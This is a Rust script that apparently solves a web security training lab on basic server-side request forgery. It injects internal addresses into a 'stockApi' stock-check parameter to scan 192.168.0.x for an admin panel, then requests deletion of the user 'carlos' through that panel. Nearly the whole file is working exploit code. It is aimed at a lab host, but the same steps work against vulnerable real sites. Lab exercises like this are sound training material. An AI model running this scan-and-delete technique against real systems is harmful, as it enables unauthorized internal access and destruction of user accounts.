/************************************************************
*
* Lab: Basic SSRF against another back-end system
*
* Hack Steps:
*      1. Inject payload into 'stockApi' parameter to scan
*         the internal network
*       2. Delete carlos from the admin interface
*
*************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    process,
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a6800f903fe3b4184ef0b2900d300a1.web-security-academy.net";

fn main() {
    println!("⦗#⦘ Injection point: {}", "stockApi".yellow());

    for x in 0..255 {
        let payload = format!("http://192.168.0.{x}:8080/admin");

        print!(
            "\r⦗1⦘ Injecting payload to scan the internal netwrok ({}).. ",
            payload.yellow()
        );
        flush_terminal();

        let check_stock = check_stock_with_payload(&payload);

        if check_stock.status().as_u16() == 200 {
            println!("{}", "OK".green());
            print!("⦗2⦘ Deleting carlos from the admin interface.. ");
            flush_terminal();

            let new_payload = format!("{payload}/delete?username=carlos");
            check_stock_with_payload(&new_payload);

            println!("{}", "OK".green());
            println!("🗹 The lab should be marked now as {}", "solved".green());
            process::exit(0);
        }
    }
}

fn check_stock_with_payload(payload: &str) -> Response {
    let cliet = build_web_client();
    cliet
        .post(format!("{LAB_URL}/product/stock"))
        .form(&HashMap::from([("stockApi", &payload)]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the page with the injected payload".red()
        ))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
